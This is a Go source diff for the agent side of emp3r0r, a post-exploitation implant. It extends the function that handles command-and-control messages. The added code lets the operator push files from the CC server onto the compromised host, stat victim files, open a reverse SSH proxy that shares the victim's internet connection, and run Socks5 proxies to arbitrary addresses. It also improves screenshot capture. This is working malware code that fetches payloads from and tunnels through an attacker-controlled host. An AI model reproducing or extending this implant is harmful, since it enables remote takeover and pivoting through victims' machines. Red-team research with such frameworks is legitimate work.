@@ -1,7 +1,9 @@
 package agent
 
 import (
+	"context"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -10,6 +12,7 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -47,9 +50,11 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 
-			out = util.Screenshot()
-			if out == "" {
-				out = "Error: failed to take screenshot"
+			out, err = util.Screenshot()
+			if err != nil {
+				out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
 			}
 
 			// move to agent root
@@ -145,9 +150,93 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		// put file on agent
+		if cmdSlice[0] == "put" {
+			if len(cmdSlice) < 4 {
+				return
+			}
+
+			url := fmt.Sprintf("%swww/%s", CCAddress, cmdSlice[1])
+			path := cmdSlice[2]
+			size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
+			if err != nil {
+				out = fmt.Sprintf("processCCData: cant get size of %s: %v", url, err)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
+			}
+			_, err = DownloadViaCC(url, path)
+			if err != nil {
+				out = fmt.Sprintf("processCCData: cant download %s: %v", url, err)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
+			}
+
+			// checksum
+			checksum := tun.SHA256SumFile(path)
+			downloadedSize := util.FileSize(path)
+			out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", path, checksum)
+			if downloadedSize < size {
+				out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, size, checksum)
+			}
+
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// stat file
+		if cmdSlice[0] == "!stat" {
+			if len(cmdSlice) < 2 {
+				return
+			}
+
+			fi, err := os.Stat(cmdSlice[1])
+			if err != nil {
+				out = fmt.Sprintf("cant stat file %s: %v", cmdSlice[1], err)
+			}
+			var fstat util.FileStat
+			fstat.Permission = fi.Mode().String()
+			fstat.Size = fi.Size()
+			fstat.Checksum = tun.SHA256SumFile(cmdSlice[1])
+			fstat.Name = util.FileBaseName(cmdSlice[1])
+			fiData, err := json.Marshal(fstat)
+			out = string(fiData)
+			if err != nil {
+				out = fmt.Sprintf("cant marshal file info %s: %v", cmdSlice[1], err)
+			}
+
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
 		/*
 		   !command: special commands (not sent by user)
 		*/
+		// reverse proxy
+		if cmdSlice[0] == "!"+ModREVERSEPROXY {
+			if len(cmdSlice) != 2 {
+				return
+			}
+			addr := cmdSlice[1]
+			out = "Reverse proxy for " + addr + " finished"
+
+			hasInternet := tun.HasInternetAccess()
+			isProxyOK := tun.IsProxyOK(AgentProxy)
+			if !hasInternet && !isProxyOK {
+				out = "We dont have any internet to share"
+			}
+			for p, cancelfunc := range ReverseConns {
+				if addr == p {
+					cancelfunc() // cancel existing connection
+				}
+			}
+			addr += ":" + ReverseProxyPort
+			ctx, cancel := context.WithCancel(context.Background())
+			if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
+				out = err.Error()
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
 
 		// LPE helper
 		if strings.HasPrefix(cmdSlice[0], "!lpe_") {
@@ -164,8 +253,8 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 			log.Printf("Got proxy request: %s", cmdSlice)
-			port := cmdSlice[2]
-			err = Socks5Proxy(cmdSlice[1], "127.0.0.1:"+port)
+			addr := cmdSlice[2]
+			err = Socks5Proxy(cmdSlice[1], addr)
 			if err != nil {
 				log.Printf("Failed to start Socks5Proxy: %v", err)
 			}
@@ -210,6 +299,19 @@ func processCCData(data *MsgTunData) {
 			default:
 			}
 
+			return
+		}
+
+		// delete_portfwd
+		if cmdSlice[0] == "!delete_portfwd" {
+			if len(cmdSlice) != 2 {
+				return
+			}
+			for id, session := range PortFwds {
+				if id == cmdSlice[1] {
+					session.Cancel()
+				}
+			}
 			return
 		}
 
@@ -331,8 +433,11 @@ func processCCData(data *MsgTunData) {
 			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
 			goto send
 		}
-		log.Printf("Saved %s from CC", path)
-		data2send.Payload = fmt.Sprintf("#put %s successfully done", path)
+		size := float32(len(decData)) / 1024
+		sha256sum := tun.SHA256SumRaw(decData)
+		data2send.Payload = fmt.Sprintf("#put %s successfully done:\n%fKB (%s)", path, size, sha256sum)
+		log.Printf("Saved %s from CC\n%s", path, data2send.Payload)
+		goto send
 
 	default:
 	}
